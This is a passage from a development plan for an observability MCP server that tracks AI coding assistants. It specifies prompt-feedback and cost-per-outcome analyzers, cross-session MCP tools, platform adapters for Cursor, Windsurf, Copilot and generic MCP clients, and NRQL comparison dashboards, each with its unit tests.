- Create `packages/nr-ai-mcp-server/src/metrics/prompt-feedback.ts`
- Implement `PromptFeedbackEngine` that combines CLAUDE.md tracking (4.4), collaboration profiles (4.3), and trend analysis (4.2) into actionable prompt engineering insights:
  - **Correlation analysis:**
    - `correlatePromptStyleWithOutcomes(developer: string, windowWeeks: number)` — analyze how a developer's prompting style (from collaboration profile) correlates with session outcomes:
      - Sessions where the developer provided file paths in prompts → compare efficiency vs sessions without
      - Sessions where the developer gave multi-step instructions → compare task success rate
      - Sessions where the developer used `/plan` mode → compare first-attempt quality
    - Returns: `PromptCorrelation[]` — ranked list of prompt behaviors and their measured impact
  - **CLAUDE.md A/B comparison:**
    - `compareClaudeMdVersions(changeTimestamp: number)` — leverages `ClaudeMdTracker.computeImpact()` but enriches with statistical confidence:
      - Compute effect size (Cohen's d) for each metric
      - Label changes as "significant" (|d| > 0.5) or "noise" (|d| < 0.2)
    - Returns: `ClaudeMdAbComparison` with per-metric effect sizes and confidence labels
  - **Recommendation generation:**
    - `generatePromptRecommendations(developer: string)` — based on the developer's profile and outcomes, suggest specific improvements:
      - If `correctionRate > 0.3`: "Consider providing more context in initial prompts — your correction rate is 30%, vs team average 15%"
      - If `taskComplexity` is high but `autonomy` is low: "For complex tasks, try using /plan mode to align on approach before implementation"
      - If `readEfficiency < 0.5` (from anti-pattern data): "Your sessions show frequent file re-reads. Adding relevant file paths to your initial prompt can reduce this"
      - If CLAUDE.md change had negative impact: "Recent CLAUDE.md update increased costs by 18%. Consider reverting or refining the changes"
    - Returns: `PromptRecommendation[]` — ranked suggestions with measured evidence
  - Each recommendation includes: `{ category: string; message: string; evidence: string; estimatedImpact: string; priority: 'high' | 'medium' | 'low' }`
- Expose via MCP tool: `get_prompt_recommendations` — returns personalized recommendations for the requesting developer
- Emit as custom event: `AiPromptRecommendation` per recommendation per developer per week

**Testing:**

- Unit test: developer who provides file paths in 80% of sessions has higher efficiency than one who provides them in 20% → correlation detected
- Unit test: CLAUDE.md A/B with large effect size (d > 0.8) → labeled "significant"
- Unit test: CLAUDE.md A/B with small effect size (d < 0.2) → labeled "noise"
- Unit test: developer with `correctionRate` 0.35 → recommendation about providing more context
- Unit test: developer with high complexity + low autonomy → recommendation about `/plan` mode
- Unit test: developer with poor read efficiency → recommendation about file paths in prompts
- Unit test: negative CLAUDE.md impact → recommendation to review/revert changes
- Unit test: recommendations are sorted by priority (high first)
- Unit test: each recommendation includes non-empty `evidence` string with actual numbers
- Unit test: `AiPromptRecommendation` event includes category, priority, and developer

---

### 4.6 — Cost-Per-Outcome Analysis

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/metrics/cost-per-outcome.ts`
- Implement `CostPerOutcomeAnalyzer` based on Section 5.5:
  - **Outcome classification** (auto-detected from tool call patterns within each task boundary):
    - `bug_fix`: sequence includes test failure → code edit → test pass
    - `feature`: new files created (`Write` tool) or significant new functions written
    - `refactor`: files modified but test suite remains green throughout (no new test failures)
    - `investigation`: mostly `Read`/`Grep`/`Glob` with minimal or no edits
    - `configuration`: editing config files (`.json`, `.yaml`, `.yml`, `.toml`, `.env`, `.ini`)
    - `documentation`: editing `.md` files, comments, docstrings
    - `failed_attempt`: session/task ended without passing tests or explicit user approval
  - `classifyOutcome(taskToolCalls: ToolCallRecord[])` — analyze a task's tool call sequence and return the outcome category
    - Uses a priority/rule-based classifier:
      1. If test failed and never passed → `failed_attempt`
      2. If test failed then later passed after edits → `bug_fix`
      3. If `Write` created new files with substantial content → `feature`
      4. If only config-type files modified → `configuration`
      5. If only `.md` files modified → `documentation`
      6. If files modified but no test regressions → `refactor`
      7. If >80% of tool calls are `Read`/`Grep`/`Glob` → `investigation`
      8. Default: `feature` (conservative — assume productive work)
  - **Cost attribution:**
    - Each task already has `estimatedCostUsd` from the cost engine (Phase 2)
    - `attributeCosts(sessions: SessionSummary[])` — partition all tasks by outcome category and compute:
      - `costPerBugFix: number` — average cost of bug_fix tasks
      - `costPerFeature: number` — average cost of feature tasks
      - `costPerRefactor: number` — average cost of refactor tasks
      - `costPerInvestigation: number` — average cost of investigation tasks
      - `costPerConfiguration: number` — average cost of configuration tasks
      - `costPerDocumentation: number` — average cost of documentation tasks
      - `costPerFailedAttempt: number` — average cost of failed attempts
      - `wasteRatio: number` — cost of failed attempts / total cost
      - `outcomeDistribution: Record<string, { count: number; totalCost: number; avgCost: number }>` — breakdown of all outcomes
  - **ROI estimation:**
    - `estimateROI(outcomeData: OutcomeDistribution, developerHourlyCost: number)` — estimate value:
      - Each bug fix saves ~2 developer hours (configurable)
      - Each feature saves ~4 developer hours (configurable)
      - ROI = (estimated hours saved × hourly rate) - AI cost
    - Configurable time savings estimates per outcome category in config
  - Store outcome classification in `SessionSummary.outcome` field (already defined in 4.1)
- Emit custom events:
  - `AiTaskOutcome` per completed task: `{ outcome, cost_usd, tool_calls, duration_ms, developer, session_id }`
  - `AiCostPerOutcome` weekly aggregate: `{ outcome, avg_cost, count, total_cost, week }`
- Expose via MCP tool: `get_cost_per_outcome` — returns cost breakdown by outcome for a given time range

**Testing:**

- Unit test: test failure → edit → test pass sequence → classified as `bug_fix`
- Unit test: `Write` creating 3 new `.ts` files → classified as `feature`
- Unit test: edits to existing files with all tests passing → classified as `refactor`
- Unit test: 90% `Read`/`Grep` calls with 1 small edit → classified as `investigation`
- Unit test: only `.yaml` and `.json` edits → classified as `configuration`
- Unit test: only `.md` edits → classified as `documentation`
- Unit test: test failed and never passed → classified as `failed_attempt`
- Unit test: `attributeCosts` with 10 tasks (3 bug fixes @ $2, 4 features @ $5, 3 failures @ $3) → correct averages and waste ratio (9/35 ≈ 0.26)
- Unit test: `estimateROI` with 5 bug fixes ($10 total AI cost, 10 hours saved, $50/hr rate) → ROI = $490
- Unit test: `wasteRatio` is 0 when there are no failed attempts
- Unit test: outcome distribution correctly counts and sums per category
- Unit test: `AiTaskOutcome` event includes all expected attributes

---

### 4.7 — Automated Recommendations and Cross-Session MCP Tools

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/metrics/recommendation-engine.ts`
- Implement `RecommendationEngine` that synthesizes all Phase 4 analyzers into a unified recommendation system:
  - **Recommendation categories:**
    1. **Cost optimization** — from `CostPerOutcomeAnalyzer`:
       - "Investigation tasks cost $3.20 avg — consider using Grep/Glob before asking AI to explore"
       - "Failed attempts cost $4.50 avg and represent 22% of total spend — consider breaking complex tasks into smaller steps"
       - "Bug fixes cost 40% less when the initial prompt includes the failing test output"
    2. **Efficiency improvement** — from `TrendAnalyzer` + `CollaborationProfiler`:
       - "Your efficiency score dropped 15% this week — anti-pattern frequency increased; check for thrashing"
       - "Developer Bob's efficiency improved 30% after switching to /plan mode for complex tasks"
    3. **Prompt engineering** — from `PromptFeedbackEngine`:
       - Surfaces the top 3 most impactful recommendations from the feedback engine
    4. **CLAUDE.md optimization** — from `ClaudeMdTracker`:
       - "CLAUDE.md is consuming ~3,000 tokens per turn. Consider condensing rarely-used sections"
       - "Recent CLAUDE.md change improved efficiency by 12% — keep the new instructions"
    5. **Model selection** — from `TrendAnalyzer.detectModelMigrationImpact()`:
       - "Opus costs 3x more than Sonnet but only improves efficiency by 8% for your task types — consider using Sonnet for investigation tasks"
  - `generateAllRecommendations(developer: string, options?: { topN?: number })` — runs all sub-analyzers and returns a unified, deduplicated, priority-sorted list of recommendations
  - `generateTeamRecommendations()` — team-level recommendations (cross-developer patterns)
  - Each recommendation: `{ id: string; category: string; priority: 'high' | 'medium' | 'low'; title: string; detail: string; evidence: string; estimatedSavings?: string }`
- Create `packages/nr-ai-mcp-server/src/tools/cross-session-tools.ts`
- Register Phase 4 MCP tools with the server:
  - `get_session_history` — list past sessions with summary metrics (paginated)
    - Input: `{ since?: string; developer?: string; limit?: number }`
    - Output: session summaries with key metrics
  - `get_weekly_summary` — get a specific week's summary or the latest
    - Input: `{ week?: string }` (ISO week or "latest")
    - Output: weekly summary with per-developer breakdown
  - `get_trends` — get trend data for a specific metric over time
    - Input: `{ metric: string; developer?: string; weeks?: number }`
    - Output: weekly trend data points
  - `get_collaboration_profile` — get the calling developer's collaboration profile
    - Input: `{ developer?: string }`
    - Output: four-dimension profile with classification and team comparison
  - `get_claudemd_impact` — get the impact report for the most recent CLAUDE.md change
    - Input: `{}`
    - Output: before/after comparison with deltas and verdict
  - `get_cost_per_outcome` — get cost breakdown by outcome type
    - Input: `{ since?: string; developer?: string }`
    - Output: cost per category with waste ratio and ROI estimate
  - `get_recommendations` — get personalized optimization recommendations
    - Input: `{ developer?: string; topN?: number }`
    - Output: prioritized list of recommendations with evidence
- Register each tool with Zod input schemas and connect to the corresponding analyzer

**Testing:**

- Unit test: `generateAllRecommendations` combines recommendations from all sub-engines
- Unit test: recommendations are deduplicated (no near-duplicate messages)
- Unit test: recommendations are sorted by priority then by estimated impact
- Unit test: `topN` parameter limits output to N recommendations
- Unit test: team recommendations aggregate patterns across developers
- Unit test: `get_session_history` tool returns paginated session summaries with correct schema
- Unit test: `get_weekly_summary` with "latest" returns the most recent week's data
- Unit test: `get_trends` for "efficiency" over 4 weeks returns correct data points
- Unit test: `get_collaboration_profile` returns all four dimension scores + classification
- Unit test: `get_claudemd_impact` returns before/after deltas
- Unit test: `get_cost_per_outcome` returns correct per-category breakdown
- Unit test: `get_recommendations` returns prioritized list with evidence strings
- Integration test: end-to-end — persist 10 sessions over 3 weeks, call `get_recommendations` tool via MCP, verify meaningful recommendations returned

---

## Phase 5: Multi-Platform Support (4-6 weeks)

> **Goal**: Extend observability beyond Claude Code to other AI coding assistants. The MCP observability server's value proposition is cross-platform — any MCP-compatible assistant should produce the same observability data. This phase builds platform adapters, normalizes tool call data across platforms, and provides comparison dashboards.

### 5.1 — Platform Abstraction Layer and Cursor IDE Integration

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/platforms/platform-adapter.ts`
- Define a `PlatformAdapter` interface that abstracts platform-specific data collection:
  - `platformName: string` — "claude-code", "cursor", "windsurf", "copilot", "generic-mcp"
  - `initialize(config: PlatformConfig): Promise<void>` — set up platform-specific data collection
  - `normalizeToolCall(raw: unknown): NormalizedToolCall` — convert platform-specific tool call data into the shared `ToolCallRecord` schema
  - `getSessionMetadata(): PlatformSessionMetadata` — platform-specific session info (model used, IDE version, etc.)
  - `getHookInstallInstructions(): string` — platform-specific installation guide
  - `isSupported(): boolean` — runtime check: is this platform available in the current environment?
- Create `packages/nr-ai-mcp-server/src/platforms/claude-code-adapter.ts`
  - Implement `ClaudeCodeAdapter` — wraps the existing hook collector logic (Phase 1) behind the `PlatformAdapter` interface
  - This is a refactor: existing hook processing moves into the adapter, keeping the same behavior
  - `normalizeToolCall()` maps Claude Code's hook JSON (tool name, input, output, timing) to `NormalizedToolCall`
  - Session metadata: model from conversation, Claude Code version from env
- Create `packages/nr-ai-mcp-server/src/platforms/cursor-adapter.ts`
- Implement `CursorAdapter` for Cursor IDE:
  - **Data collection strategy:**
    - Cursor supports MCP servers natively — the MCP proxy (Phase 3) works with Cursor as-is for MCP tool calls
    - For built-in tool calls (file edits, terminal commands), Cursor doesn't have Claude Code-style hooks. Instead:
      - Option A: Cursor extension API — if Cursor exposes an extension API that provides tool call events, implement a VS Code extension that forwards events to the MCP server
      - Option B: File system watcher — watch the project directory for file changes and infer tool calls from file modification timestamps + Cursor process activity
      - Option C: Cursor's telemetry — if Cursor emits OpenTelemetry or has a local analytics database, read from it
    - Start with Option A (extension API) if available; fall back to Option B (file watcher) as a less precise but universally available approach
  - `normalizeToolCall()` maps Cursor's tool call format to `NormalizedToolCall` — may require mapping different tool names (e.g., Cursor's "edit" → `ToolCallRecord` type "Edit")
  - `getHookInstallInstructions()` returns Cursor-specific setup steps
- Create `packages/nr-ai-mcp-server/src/platforms/platform-registry.ts`
  - `PlatformRegistry`: manages registered platform adapters
  - `register(adapter: PlatformAdapter)` — add an adapter
  - `detect()` — auto-detect which platform is active based on environment signals (process name, env vars, file markers)
  - `getActive()` — return the currently active adapter
  - All event processing now goes through `getActive().normalizeToolCall()` before entering the metric pipeline

**Testing:**

- Unit test: `ClaudeCodeAdapter.normalizeToolCall()` converts a Claude Code hook event to `NormalizedToolCall` with correct fields
- Unit test: `ClaudeCodeAdapter.getSessionMetadata()` returns platform "claude-code" with model info
- Unit test: `CursorAdapter.normalizeToolCall()` maps Cursor tool names to normalized types
- Unit test: `PlatformRegistry.register()` and `detect()` correctly identify Claude Code from env signals
- Unit test: `PlatformRegistry.detect()` returns Cursor adapter when Cursor-specific env vars are present
- Unit test: all adapters implement the full `PlatformAdapter` interface (compile-time check via TypeScript)
- Unit test: `getHookInstallInstructions()` returns non-empty platform-specific instructions for each adapter
- Integration test: existing Claude Code test suite still passes after refactoring through the adapter layer (no behavior change)

---

### 5.2 — Windsurf Integration

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/platforms/windsurf-adapter.ts`
- Implement `WindsurfAdapter` for Windsurf (Codeium's AI IDE):
  - **Data collection strategy:**
    - Windsurf supports MCP servers — the MCP proxy (Phase 3) captures MCP tool calls automatically
    - For built-in tool calls (Windsurf's "Cascade" flow — file reads, writes, terminal commands):
      - Option A: Windsurf extension API — if Windsurf provides an extension mechanism similar to VS Code extensions, build a lightweight extension that emits events
      - Option B: Windsurf's local data — investigate whether Windsurf stores session data or tool call logs locally (e.g., in `~/.codeium/` or `~/.windsurf/`) that can be polled
      - Option C: File system watcher fallback — same as Cursor Option B: watch project directory for changes and infer tool activity
    - Like Cursor, prioritize native integration (Option A) and fall back to file watching (Option C) for availability
  - **Tool name mapping:**
    - Windsurf Cascade uses its own terminology for actions. The adapter maps these to the normalized schema:
      - Windsurf "Read File" → `NormalizedToolCall` type "Read"
      - Windsurf "Write File" → type "Write"
      - Windsurf "Edit File" → type "Edit"
      - Windsurf "Run Command" → type "Bash"
      - Windsurf "Search" → type "Grep"
      - Unknown actions → type "Unknown" with the original action name preserved as `platformToolName`
  - `normalizeToolCall()` — convert Windsurf-specific event data to `NormalizedToolCall`:
    - Map tool names using the mapping table above
    - Extract timing from Windsurf's event timestamps
    - Extract file paths, command strings, and output sizes where available
  - `getSessionMetadata()` — return Windsurf version, active model, workspace path
  - `getHookInstallInstructions()` — return Windsurf-specific MCP server configuration steps (how to add the observability server to Windsurf's MCP config)
  - `isSupported()` — check for Windsurf-specific indicators (process name `windsurf`, env vars, config directory)
- Register `WindsurfAdapter` in `PlatformRegistry` with auto-detection support

**Testing:**

- Unit test: `WindsurfAdapter.normalizeToolCall()` maps Windsurf "Read File" event → `NormalizedToolCall` with type "Read"
- Unit test: `WindsurfAdapter.normalizeToolCall()` maps Windsurf "Run Command" → type "Bash"
- Unit test: unknown Windsurf action → type "Unknown" with `platformToolName` preserved
- Unit test: `getSessionMetadata()` returns platform "windsurf"
- Unit test: `isSupported()` returns true when Windsurf process/env is detected
- Unit test: `isSupported()` returns false when in a non-Windsurf environment
- Unit test: `getHookInstallInstructions()` returns Windsurf-specific MCP configuration
- Unit test: `PlatformRegistry.detect()` selects Windsurf adapter when Windsurf env is active

---

### 5.3 — GitHub Copilot Integration (VS Code Extension Telemetry)

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/platforms/copilot-adapter.ts`
- Implement `CopilotAdapter` for GitHub Copilot (in VS Code and JetBrains):
  - **Data collection strategy:**
    - GitHub Copilot does NOT support MCP natively — the proxy layer is unavailable for Copilot
    - GitHub Copilot's agent mode (Copilot Workspace / Copilot Chat with `@workspace`) uses tools internally, but the tool call data is less accessible than Claude Code's hook mechanism
    - **Primary approach: VS Code extension telemetry:**
      - Build a companion VS Code extension (`nr-ai-copilot-observer`) that subscribes to VS Code events:
        - `vscode.workspace.onDidChangeTextDocument` — file edit events
        - `vscode.workspace.onDidOpenTextDocument` — file open/read events
        - `vscode.workspace.onDidCreateFiles` / `onDidDeleteFiles` — file creation/deletion
        - `vscode.window.onDidStartTerminalShellExecution` / `onDidEndTerminalShellExecution` — terminal command events
        - `vscode.tasks.onDidStartTask` / `onDidEndTask` — build/test task events
      - The extension detects Copilot-initiated changes by filtering for edits that originate from Copilot's output (heuristic: rapid multi-line edits not preceded by keyboard input)
      - The extension sends events to the MCP server via HTTP (localhost)
    - **Secondary approach: Copilot usage API:**
      - If the organization uses GitHub Copilot Business/Enterprise, the Copilot usage API provides aggregated metrics (completions count, acceptance rate, lines suggested vs accepted)
      - `CopilotUsageApiClient`: poll `GET /orgs/{org}/copilot/usage` for org-level metrics
      - This provides coarser data but is authoritative and requires no extension
    - **Limitation acknowledgment:**
      - Copilot observability is inherently less granular than Claude Code's hook-based collection
      - Tool call timing is approximate (inferred from event timestamps, not direct instrumentation)
      - Token counts are not available (Copilot doesn't expose token usage)
  - `normalizeToolCall()` — convert VS Code events to `NormalizedToolCall`:
    - `onDidChangeTextDocument` with Copilot attribution → type "Edit", file path from document URI
    - `onDidStartTerminalShellExecution` → type "Bash", command from terminal event
    - `onDidOpenTextDocument` → type "Read" (only if triggered during Copilot flow)
  - `getSessionMetadata()` — Copilot model (if detectable), VS Code version, Copilot extension version
  - `getHookInstallInstructions()` — instructions for installing the companion VS Code extension + configuring the MCP server endpoint
  - `isSupported()` — check if the `nr-ai-copilot-observer` extension is installed and active
- Note: The VS Code extension itself is NOT part of this deliverable — it will be its own package (`packages/nr-ai-copilot-extension/`) if pursued. This deliverable builds the adapter that consumes events from such an extension.

**Testing:**

- Unit test: `CopilotAdapter.normalizeToolCall()` converts a simulated "file edit" event → `NormalizedToolCall` type "Edit"
- Unit test: `CopilotAdapter.normalizeToolCall()` converts a simulated "terminal command" event → type "Bash"
- Unit test: `CopilotAdapter.normalizeToolCall()` converts a simulated "file open" event → type "Read"
- Unit test: `getSessionMetadata()` returns platform "copilot" with VS Code version
- Unit test: `isSupported()` returns false when the companion extension is not installed
- Unit test: Copilot usage API client parses a mock API response correctly
- Unit test: timing inference — two events 500ms apart produce a `NormalizedToolCall` with `durationMs ≈ 500`
- Unit test: `PlatformRegistry.detect()` selects Copilot adapter when VS Code + Copilot extension detected

---

### 5.4 — Generic MCP Client Support

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/platforms/generic-mcp-adapter.ts`
- Implement `GenericMcpAdapter` — a catch-all adapter for any MCP-compatible AI assistant that isn't Claude Code, Cursor, Windsurf, or Copilot:
  - **Philosophy:** Any AI assistant that speaks MCP can connect to our observability server as an MCP server. The MCP proxy layer (Phase 3) captures tool calls to upstream servers. The missing piece is built-in tool call data (file reads, writes, terminal commands) — for generic clients, we provide a tool-based reporting API.
  - **Tool-based event ingestion:**
    - Register an MCP tool: `report_tool_call` — allows any MCP client to explicitly report tool call events
      - Input schema:
        ```
        {
          tool: string,           // tool name (e.g., "Read", "Edit", "Bash")
          input: object,          // tool input (e.g., { file_path: "..." })
          output_size_bytes?: number,
          success: boolean,
          duration_ms?: number,
          error?: string,
          timestamp?: number      // epoch ms, defaults to now
        }
        ```
      - The MCP server processes these exactly like hook-collected events — same metric pipeline, same NR ingestion
    - Register MCP tool: `report_session_start` — report that a new session has begun
      - Input: `{ platform: string; model?: string; developer?: string }`
    - Register MCP tool: `report_session_end` — report that the session has ended
      - Input: `{ summary?: string }`
  - **Automatic MCP proxy observability:**
    - Any MCP client using our proxy gets MCP tool call metrics for free (from Phase 3)
    - The generic adapter adds: `report_tool_call` for non-MCP tool calls the client wants to report
  - `normalizeToolCall()` — minimal normalization: validate the `report_tool_call` input and wrap it as a `NormalizedToolCall`
  - `getSessionMetadata()` — returns whatever the client provided via `report_session_start`; platform name defaults to "generic-mcp"
  - `getHookInstallInstructions()` — returns generic instructions: "Add this MCP server to your assistant's MCP configuration. Use `report_tool_call` to report non-MCP tool activity. MCP tool calls are captured automatically via the proxy."
  - `isSupported()` — always returns true (this is the fallback adapter)
- Update `PlatformRegistry`:
  - `GenericMcpAdapter` is always registered as the fallback — if no other adapter matches, this one is used
  - Detection priority: Claude Code → Cursor → Windsurf → Copilot → Generic MCP
- Document the generic integration guide: which tools to call, what data to report, what comes "for free" via the proxy

**Testing:**

- Unit test: `report_tool_call` with a complete input → valid `NormalizedToolCall` enters the metric pipeline
- Unit test: `report_tool_call` with missing optional fields → defaults applied (duration_ms = 0, timestamp = now)
- Unit test: `report_tool_call` with invalid input (missing required `tool` field) → error response
- Unit test: `report_session_start` initializes session metadata correctly
- Unit test: `report_session_end` triggers session summary persistence (calls `SessionStore.saveSession()`)
- Unit test: `isSupported()` always returns true
- Unit test: `PlatformRegistry` fallback — when no specific platform detected, generic adapter is selected
- Unit test: generic adapter processes events through the same metric pipeline as Claude Code adapter (same `AiToolCall` events emitted)
- Integration test: simulate a generic MCP client calling `report_tool_call` 10 times, verify all events appear in the metric aggregates

---

### 5.5 — Platform Comparison Dashboards

**Implementation:**

- Create `packages/nr-ai-mcp-server/dashboards/ai-coding-assistant-platform-comparison.json`
- Build the "AI Coding Assistant — Platform Comparison" pre-built dashboard:
  - **Row 1 — Platform overview** (Billboard + Bar):
    - Active platforms (`SELECT uniqueCount(platform) FROM AiToolCall SINCE 7 days ago`)
    - Sessions by platform (`SELECT count(*) FROM AiSessionSummary FACET platform SINCE 7 days ago`)
    - Tool calls by platform (`SELECT count(*) FROM AiToolCall FACET platform SINCE 7 days ago`)
    - Total cost by platform (`SELECT sum(estimated_cost_usd) FROM AiSessionSummary FACET platform SINCE 7 days ago`)
  - **Row 2 — Efficiency comparison** (Bar + Line):
    - Average efficiency score by platform (`SELECT average(efficiency_score) FROM AiSessionSummary FACET platform SINCE 7 days ago`)
    - Task success rate by platform (`SELECT average(task_success_rate) FROM AiSessionSummary FACET platform SINCE 7 days ago`)
    - Average tool calls per task by platform (`SELECT average(tool_calls_per_task) FROM AiTaskOutcome FACET platform SINCE 7 days ago`)
    - Weekly efficiency trend per platform (`SELECT average(efficiency_score) FROM AiSessionSummary FACET platform TIMESERIES 1 week SINCE 4 weeks ago`)
  - **Row 3 — Cost comparison** (Bar + Line):
    - Average cost per session by platform (`SELECT average(estimated_cost_usd) FROM AiSessionSummary FACET platform SINCE 7 days ago`)
    - Average cost per task by platform (`SELECT average(cost_usd) FROM AiTaskOutcome FACET platform SINCE 7 days ago`)
    - Cost per outcome type by platform (`SELECT average(cost_usd) FROM AiTaskOutcome FACET platform, outcome SINCE 7 days ago`)
    - Weekly cost trend per platform (`SELECT sum(estimated_cost_usd) FROM AiSessionSummary FACET platform TIMESERIES 1 week SINCE 4 weeks ago`)
  - **Row 4 — Tool usage patterns** (Stacked Bar + Pie):
    - Tool type distribution by platform (`SELECT count(*) FROM AiToolCall FACET tool, platform SINCE 7 days ago`)
    - Anti-pattern frequency by platform (`SELECT count(*) FROM AiAntiPattern FACET anti_pattern_type, platform SINCE 7 days ago`)
    - Session duration by platform (`SELECT average(duration_ms) / 60000 AS 'avg_minutes' FROM AiSessionSummary FACET platform SINCE 7 days ago`)
    - Model usage by platform (`SELECT count(*) FROM AiSessionSummary FACET model, platform SINCE 7 days ago`)
  - **Row 5 — Platform-specific insights** (Table):
    - Platform feature coverage matrix — which data is available from each platform:
      - Built-in tool calls: Claude Code ✓, Cursor ?, Windsurf ?, Copilot ?, Generic (manual)
      - MCP proxy data: All ✓ (if using proxy)
      - Token counts: Claude Code ✓, others vary
      - Audit trail: Claude Code ✓, others limited
    - Render as a static Markdown widget or custom visualization (table of platform capabilities)
- Ensure all `AiToolCall`, `AiSessionSummary`, `AiTaskOutcome`, and `AiAntiPattern` events include a `platform` attribute:
  - Update the NR transport layer (Phase 1) to include `platform` from `PlatformAdapter.platformName` on every emitted event
  - This is a small change in the event builder — add `platform` to the default attributes
- Update `packages/nr-ai-mcp-server/src/tools/cross-session-tools.ts`:
  - Add `get_platform_comparison` MCP tool:
    - Input: `{ metric: string; weeks?: number }` (metric = "efficiency", "cost", "task_success_rate", etc.)
    - Output: per-platform comparison for the requested metric over the specified time range
- Update deploy script to include the platform comparison dashboard

**Testing:**

- Unit test: dashboard JSON is valid NR dashboard structure
- Unit test: all NRQL queries are syntactically valid
- Unit test: all NRQL queries include `FACET platform` for cross-platform comparison
- Unit test: `platform` attribute is present on all emitted `AiToolCall` events when a platform adapter is active
- Unit test: `platform` attribute defaults to "claude-code" for backwards compatibility
- Unit test: `get_platform_comparison` tool returns per-platform data for "efficiency" metric
- Unit test: `get_platform_comparison` tool returns per-platform data for "cost" metric
- Manual test: deploy to test NR account; verify all widgets render with mock multi-platform data
